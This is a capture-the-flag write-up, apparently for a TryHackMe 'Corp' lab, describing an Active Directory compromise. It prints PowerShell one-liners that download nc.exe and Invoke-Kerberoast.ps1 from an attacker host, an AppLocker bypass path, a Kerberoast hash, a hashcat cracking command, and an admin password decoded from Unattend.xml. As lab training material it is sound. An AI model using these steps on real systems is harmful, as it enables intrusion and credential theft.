> Corp

# Credentials

```
Username: corp\dark
Password: _QuejVudId6
```

`xfreerdp /f /u:"corp\dark" /p:"_QuejVudId6" /v:$IP`

Looks like AppLocker is in place. AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.

# Bypassing AppLocker

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default.

`powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.8.107.21:8000/nc.exe', 'C:\Windows\System32\spool\drivers\color\nc.exe')"`

And we have nc.exe. And we can execute and so we have bypassed AppLocker.

Get-Content -Path 'C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'

```
flag{a12a41b5f8111327690f836e9b302f0b}
```

`setspn -T medin -Q ​ */*` => extract all accounts in the SPN.

```
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
```

Let's use Invoke-Kerberoast to get a ticket.

powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.8.107.21:8000/Invoke-Kerberoast.ps1', 'C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1')"

Le's load it into the system. We have to this 1 line at the end of Invoke-Kerberoast.ps1 file. `Invoke-Kerberoast -OutputFormat hashcat |fl`. And we got a ticket. 

```
TicketByteHexStream  :                                                                         Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$8027FC7B7AF5CEABDF2BC4F311095B5                        A$08DAEC705F9A469A3A18CC3ADCDA0ACE4EC468D739A4AC4489B9C88565A8243812A4E                        FF6604520AFC3218F7928C921CFE5489A092FAD6E5100235D600E69F933CA6CCA144DD7                        7E7FA7590CC1CC75364574F6C8A7F2EB1AA0F741185B7B5228E8759B1EDF466F7A87336                        E410FD21BEC812C2AB9890E0C38B610B378EFDB9B3802C8E379CD2BF07C9AD4D916B0AC                        1005281399CC88F4538E3EBEF305C45BB23F78D62EDD487AE3734EE664237C35ECB33F9                        3A453DEC3C76E921E39D05420BB4FB8266960E9C92589C995943590A85CC65F75D724CD                        C1BE51B83E4FD1B8290A327E8FE338D705D9C3A7E0AD7DD6BCD77274E034F2C4681F10E                        27ED8365A414DFC28E980690878BEA64D4027D07EF6AC0AE2AD8D0AD82BDE1E0328ED1F                        FBFD9CE879D51431C524799F5EDE155AFBCC49639CD2A9E03EA64A732C85A2CEFD73148                        EE18B0EA667D9DCF7541AEC6AB9F95B5B7EB8B1777837F872FD1CC9D4492520B8369AB9                        A72B40E68E5DA2B48EF71B6DC5FAAB1F31629CAA1D2BCE50303E6EFB2E58985A1EAFE34                        1584C5E0F2D0595E9CD3E409752C0A57C6C186D98DD1BC03CE218FDF49AFFC5EE7A658F                        9C6F7E5223E9E3D7891C3815C44EA8BC099EAE55C7D500729784A62AC7BEA97B23A3031                        1CEB7344E038F45B20A17557675B555AD6A5C0E0D61367C83B09CD06378B97A9B869BBA                        44243C7D410E14EA8F29DF4C3746DBF7ACBC4113D10F8D1C0180997890CBAAC9405BD8F                        0A7318CD5A7B6D38D4BE78F50584A07D1D2A1E7BEC2C17FA3BB8F57E00B05754933E431                        995BEA5BB755B675528F5D49F96113DFCDCFA095052DF9296202D620E83C80D16608979                        EEFDAE0203FC553446A186DDA3ED98DD92CAD6FD9E0F0AD57E117F1B3188B7BA7A1C2B1                        74073D6B6BF2DBB03D00CE1146971162DBEE3792E991F1AD4D518D5455F57C57DCECD90                        5A8DAD54960B715E183DD5B9973A1BAF3500506F69ECFF1471B19DCD3F13746E1955FC5                        AD4C16A25F126073C2058BB8524F2E93C76E17DA79EEED8E8F79A23FBF000FBFA46C925                        E1FEF202B872561C374D8C9416385236F759EE27DFA3449B91E1DF49175A4A458F58940                        E9467631BF7B625A2F18F7C12F6324074ED82466FFEE83C5B5E93F391A6A5BB8912D6F6                        6CB40698009148A3C58E44538F71781786001A64826EA8C6F7B8381818C9C203279ECF8                        522E85551831FB8394B059D852B2BA5903FE2442F416A2DD1267729E96C8C393FB0E09E                        E4490E9ED702DA5D265E2C85D6BE263313BA1CAA7915541DB694B4F9B8A1F8C8FCE15A8                        ED01C664EE10D1CBF88516D13E11C19545FE9B8B5FAE118FD2ECDB6C2D765D34E6C2D95                        DB8E074D0F5541714F601ACDA58A4A28C74CC650B2F7032E4BD30ACE1CE28FA9AF6A742 SamAccountName       : fela                                                                    DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local                                       ServicePrincipalName : HTTP/fela 
```

# Cracking with hashcat

hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

```
rubenF124
```

fela:rubenF124

xfreerdp /f /u:"fela" /p:"rubenF124" /v:10.10.125.84

# user.txt

```
flag{bde1642535aa396d2439d86fe54a36e4}
```

# Privilege Escalation

We can tranfer PowerUp1.ps1 and try to get ways to admin access. 1st in Bypassing UAC and next is `UnattendedPath`.
Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.

# C:\Windows\Panther\Unattend\Unattended.xml.

```
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value> => On decoding it we got `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T`
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```

Let's login as admin now.

xfreerdp /u:'corp/administrator' /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.125.84

# root.txt

```
THM{g00d_j0b_SYS4DM1n_M4s73R}
```